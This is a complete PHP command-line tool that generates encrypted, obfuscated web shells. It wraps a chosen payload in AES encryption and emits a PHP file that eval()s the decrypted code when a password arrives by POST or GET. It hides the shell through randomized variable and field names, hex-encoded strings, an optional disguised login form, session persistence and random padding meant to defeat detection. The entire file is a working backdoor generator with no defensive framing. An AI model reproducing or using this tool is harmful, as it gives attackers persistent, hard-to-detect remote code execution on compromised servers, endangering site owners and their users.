#!/usr/bin/env php

<?php
    $options = getopt("hsfp:n:k:i::c::m:ro:");
    if (isset($options['h']) || empty($options))
    {
        echo "Usage: $argv[0] [options] -p <payload> -k <password> -o <output>\n\n";
        echo "Options:\n" .
             "   -h              Display this help message and exit\n" .
             "   -s              Save the password to a session cookie\n" .
             "   -f              Add a login form to access the web shell\n" .
             "   -p <payload>    The file containing the payload\n" .
             "   -n <field>      The name of the password field\n" .
             "   -k <password>   The password to encrypt the payload\n" .
             "   -i <passfile>   Read the password from file\n" .
             "   -c <cipher>     The cipher algorithm and mode of operation as\n" .
             "                   identified by openssl (example: AES-256-CTR)\n" .
             "   -m POST|GET     The method used to get the password\n" .
             "   -r              Fill the end of the code with random noise\n" .
             "   -o <output>     Save the web shell as <output_file>\n\n";
        exit;
    }
    if (isset($options['k']))
        $password = $options['k'];
    elseif (isset($options['i']))
        $password = @fread(fopen($options['i'], 'r'), filesize($options['i']));
    else
        $password = readline("Password: ");
    if (!isset($password) || empty($password))
       die("$argv[0]: You must provide a password!\n");
    if (isset($options['p']))
       $payload = @fread(fopen($options['p'],'r'),filesize($options['p']));
    if (!isset($payload) || empty($payload))
        die("$argv[0]: Invalid payload!\n");
    $cipher = isset($options['c']) ? $options['c'] : "AES-256-CTR";
    echo "[+] Encrypting payload using $cipher\n";
    if (!isset($options['o']))
        die("$argv[0]: You must provide a name to the output file!\n");
    $method = isset($options['m']) ? strtoupper ($options['m']) : "POST";
    echo "[+] The webshell will receive the password using $method\n";
    function hex_encode($str)
    {
        return '\x' . implode('\x', array_map('bin2hex', str_split($str)));
    }
    $iv = random_bytes(16);
    $pass_field = isset($options['n']) ? $options['n'] :
                  "_" . bin2hex(random_bytes(random_int(5, 40)));
    echo "[+] The password field has the name '$pass_field'\n";
    $payload_var = "_" . bin2hex(random_bytes(random_int(5,60)));
    $encrypted = openssl_encrypt($payload, $cipher, $password, 0, $iv);
    $iv = bin2hex($iv);
    echo "[+] Encrypting with IV: $iv\n";
    $output_code = "<?php \$$payload_var=\"$encrypted\";" .
    (isset($options['s']) ? "session_start();" : "") . "if(!empty(" .
    "\$$pass_field=\$_${method}['$pass_field']))";
    $cipher = hex_encode($cipher);
    if (isset($options['s']))
        $output_code .= "\$_SESSION['$pass_field']=\$$pass_field;if(isset(" .
        "\$_SESSION['$pass_field']))";
    $output_code .= "eval(openssl_decrypt(\$$payload_var,\"$cipher\"," .
                    (isset($options['s']) ? "\$_SESSION['$pass_field']" :
                    "\$$pass_field") . ",0,hex2bin(\"$iv\")));";
    if (isset($options['f']))
        $output_code .= "else echo\"" . hex_encode(
            "<form method=\"$method\">\n" .
            "    <input name=\"$pass_field\" type=\"password\">\n" .
            "    <input type=\"submit\" value=\"Go\">\n" .
            "</form>\n"
        ) . "\";";
    if (isset($options['r']))
        $output_code .= "\$$payload_var=\"" .
            base64_encode(random_bytes(random_int(128,512))) ."\";";
    $output_code .= " ?>";
    $out_file = @fopen($options['o'], "w");
    if (!isset($out_file))
        die("$argv[0]: Can't open " . $options['o'] . " to write\n");
    fwrite($out_file, $output_code);
    fclose($out_file);
    echo "[+] File was saved as '" . $options['o'] . "'\n";
?>
